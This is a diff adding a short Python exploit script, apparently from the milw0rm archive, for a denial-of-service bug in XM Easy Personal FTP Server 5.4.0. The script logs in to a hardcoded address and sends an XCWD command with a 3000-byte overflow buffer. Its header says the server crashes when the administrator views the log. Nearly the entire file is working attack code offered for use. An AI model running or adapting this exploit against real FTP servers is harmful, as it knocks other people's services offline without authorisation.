@@ -1,0 +1,40 @@
+#!/usr/bin/python
+########################################
+# XM Easy Personal FTP Server 5.4.0 (XCWD) DoS
+#
+# When admin looks at the server log, application crashes :)
+#
+# Elhamdulillahi Rabbil-alemin!
+#
+########################################
+# bt ~ # ./sploit.py
+#
+# [+] Saljemo zli bafer :)
+# [+] Now wait until the admin looks at server log :)
+# [+] Finito!
+#
+########################################
+# Vulnerability discovered and coded by Muris Kurgas a.k.a j0rgan
+# jorganwd [at] gmail [dot] com
+# http://www.jorgan.users.cg.yu
+########################################
+
+import struct
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+bafer = '\x41' * 3000
+print "\n [+] Saljemo zli bafer :)"
+s.connect(('192.168.190.132',21))
+data = s.recv(1024)
+s.send('USER ftp' +'\r\n')
+data = s.recv(1024)
+s.send('PASS lozinka' +'\r\n')
+data = s.recv(1024)
+print " [+] Now wait until the admin looks at server log :)"
+s.send('XCWD ' +bafer+ '\r\n')
+s.close()
+print " [+] Gotovo! "
+
+# milw0rm.com [2008-04-13]
